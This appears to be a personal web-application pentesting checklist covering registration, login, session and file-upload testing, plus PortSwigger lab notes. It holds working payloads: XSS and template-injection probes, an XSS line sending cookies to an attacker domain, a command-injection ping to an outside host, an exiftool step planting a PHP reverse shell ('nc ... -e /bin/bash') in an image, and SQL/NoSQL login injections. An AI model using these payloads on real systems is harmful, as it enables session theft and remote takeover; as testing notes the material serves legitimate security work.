# Test Register 

### No Length Limit On Password
```bash
T123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789hellohellohellohello
```
### Email Verification Bypass
- Verified : False TO Verified : True
- Create account with existing username or email

### Test For HTMLi , XSSi, SSTI , SCTI
```bash
<img src=x onerror=alert()>${{7*7}}
<img src=x>'”${{7*7}}
 ```
### Hyperlink Injection
- add Url in emial and check if it is clickable in web page or emial links

#### ### HyperLink Injection POC
- Go to https://rdiffweb-dev.ikus-soft.com/prefs/general 
- Set your full name as "Your account has been hacked please visit evil.com"
- Save changes
- Perform any activity that will lead to triggering an email on the victims registered email address (Password change / request to enable 2FA)
- Victim will receive an email where evil.com is in the form of  a hyperlink 
- As soon as he will click on evil.com he will be redirected to the malicious website

Let us consider a scenario where the user has left his account open in a cafe or library . Attacker gets access to the account , will change Full name to Your account has been hacked please visit evil.com , evil.com will be in the form of a hyperlink in the email received by the user. As soon as victim clicks , he is redirected to malicious website

Mitigation: Full name is a field that requires only alphabets (in worst case some may have numbers) , prevent all entries of special characters including a ' . '

As soon as he click
An attacker can redirect victim to malicious website

### Session Management Issue
- Check if same session is assigned before login and after login
- Check Session in burp sequencer
- No session expiration after logout
- Session fiation
- Session Puzzling / Session Variable Overloading. Request Forgot Password Immideatly Aceess Dashboard Page
- XSS + session hijacking
```html
<img src=”x” onerror=this.src=”<attacker domain>?cookie=”+document.cookie>
test'||ping -c 10 colaburl.net
 ```
 
 ### Test FileUpload
 - XMLi and XSSi using SVG file upload.
 - Not-supported File Type upload. 
 - RCE via file upload (this type of vuln gives high pay-outs ,here’s a nice (reference https://anotherhackerblog.com/exploiting-file-uploads-pt-2/)
 - brute force OTP sent for verification
 - PolyGloit File Upload
 [More on file upload](https://medium.com/@cicadasec/malicious-file-upload-checklist-24e0b764de95)
```bash
 exiftool -Comment=’<?php system(“nc <YourIP> <YourPort> -e /bin/bash”); ?>’ filename.png
 mv filename.png filename.php.png
  ```
  
  #### Redirect URI is not Validated
  
  # Test Login
```bash
  username'and 1=1 --
  username'and 1=1; --
  password[$gt]="toto"
  password : {"$gt":"lolo"}
  ```
  
   #### Redirect URI is not Validated
   
   #### Password Reset Link Not Expiring After Email Change
   
   #### Failed to invalidate the session
   ```bash
Vulnerability Category: A5-Broken Access Control
Use previous session id to perform operation after logout request
1 : Log In & Open Your Profile
2 : Copy Url & Session ID / Store It In Repeater
3 : Request For Logout
4 : Use Repeater With Same Session ID Before LogOut
   ```

#### Vulnerability Category: A6- Security Misconfiguration
```bash
Vulnerability Description: This vulnerability leads to user enumeration when an 
attacker trying to brute-force of email accounts on registration page. In the 
login page attacker tries to brute-force the user credentials. When an user 
wants to reset his password and there is no rate limiting on the function, 
an attacker can take this as advantage and perform email flooding on user’s 
email account.
```

### Content spoofing in error page
```bash
Text Based Injection: Text injection or Text-Based Injection(TBI) is an 
injection in which user input is reflected as it is in the application 
response as plaintext. This is one of the ways to perform content spoofing 
also referred to as content injection or virtual defacement which can be used 
in phishing attacks.


https://example.com/captcha/SS%2F%20%20%20is%20not%20available.%20Please%20visit%20-%20-%20-%20-%20https://attacker.com%20%20-%20-%20-%20-%20as%20resource%20

https://example.com/captcha/SS/   is not available. Please visit - - - - https://attacker.com  - - - - as resource
  ```
  
 #### Web Cache Deception to ATO
 ```bash
 https://example.com/session/ --> Same Response
https://example.com/session/victim.css --> Same Response cached
 ```

#### Portswigger Lab
##### 1 : Username Enumration Via Different Responses
- Try a valid username and a invalid string
- You will see diffrent response
- Get a valid username and bruteforce password

##### 2 : 2Fa simple bypass
- Forced Browsing To /my-account

##### 3 : Password Reset Broken Login
- IDOR to password change of any user

##### 4 : Username Enumration Via Different Keyword
- If username is invalid : Invalid username of password.
- If username is valid : Invalid username or password

  
